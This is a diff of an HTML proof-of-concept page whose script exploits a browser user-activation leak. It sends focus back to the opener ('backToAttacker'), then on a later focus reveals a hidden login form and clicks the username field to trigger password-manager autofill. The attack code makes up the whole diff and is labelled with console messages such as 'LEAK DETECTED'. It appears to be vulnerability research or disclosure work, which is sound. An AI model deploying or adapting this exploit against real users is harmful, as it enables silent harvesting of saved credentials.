@@ -3,49 +3,57 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>PoC - Target Page (Vulnerable Origin)</title>
+    <title>PoC - Target Page</title>
 </head>
 
 <body style="background: #e3f2fd; font-family: sans-serif; text-align: center; padding: 50px;">
-    <h1>success, you're human</h1>
 
-    <div
-        style="margin-top: 20px; background: white; padding: 20px; border-radius: 8px; display: inline-block; border: 1px solid #ccc;">
-        <p style="font-size: 12px; color: #666;">Security Verification Field (Hidden Payload)</p>
-        <input type="text" id="fake-user" name="username" autocomplete="username" placeholder="Username"
-            style="display: block; margin: 10px auto; padding: 10px;">
-        <input type="password" id="fake-pass" name="password" autocomplete="current-password" placeholder="Password"
-            style="display: block; margin: 10px auto; padding: 10px;">
+    <div id="status-container">
+        <h1>Processing...</h1>
+        <p>Please wait while we verify your session.</p>
+    </div>
+
+    <div id="secret-form"
+        style="display: none; margin-top: 20px; background: white; padding: 20px; border-radius: 8px; border: 1px solid #ccc; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
+        <h3>Login to Continue</h3>
+        <input type="text" id="user-field" name="username" autocomplete="username" placeholder="Username"
+            style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
+        <input type="password" id="pass-field" name="password" autocomplete="current-password" placeholder="Password"
+            style="display: block; margin: 10px auto; padding: 10px; width: 80%;">
     </div>
 
     <script>
-        if (window.opener) {
-            setTimeout(() => {
+        let currentStage = 1;
+
+        function backToAttacker() {
+            if (window.opener) {
                 window.opener.focus();
-            }, 500);
-        }
-
-        let triggered = false;
-
-        function checkAndExploit(triggerSource) {
-            const isActive = navigator.userActivation.isActive;
-            const userInput = document.getElementById('fake-user');
-
-            console.log(`[${triggerSource}] Activation state:`, isActive);
-
-            if (isActive && !triggered) {
-                triggered = true;
-                console.log("[!] Activation leak detected. Triggering Autofill...");
-                userInput.focus();
-                userInput.click();
-
-                console.log("[!!!] Autofill / Password Manager should be visible now.");
-                setTimeout(() => { triggered = false; }, 2000);
             }
         }
 
-        window.addEventListener("focus", () => checkAndExploit("focus"));
-        window.addEventListener("pageshow", () => checkAndExploit("pageshow"));
+        function checkAndExploit() {
+            const isActive = navigator.userActivation.isActive;
+            const formContainer = document.getElementById('secret-form');
+            const statusContainer = document.getElementById('status-container');
+            const userField = document.getElementById('user-field');
+
+            console.log(`[Stage ${currentStage}] Focus detected. Activation:`, isActive);
+
+            if (currentStage === 1) {
+                console.log("[*] Stage 1: Stealth mode. Returning focus...");
+                backToAttacker();
+                currentStage = 2;
+            }
+            else if (currentStage === 2 && isActive) {
+                console.log("[!] Stage 2: LEAK DETECTED! Revealing and triggering Autofill...");
+                statusContainer.style.display = 'none';
+                formContainer.style.display = 'inline-block';
+                userField.focus();
+                userField.click();
+
+            }
+        }
+        window.addEventListener("focus", checkAndExploit);
     </script>
 </body>
 
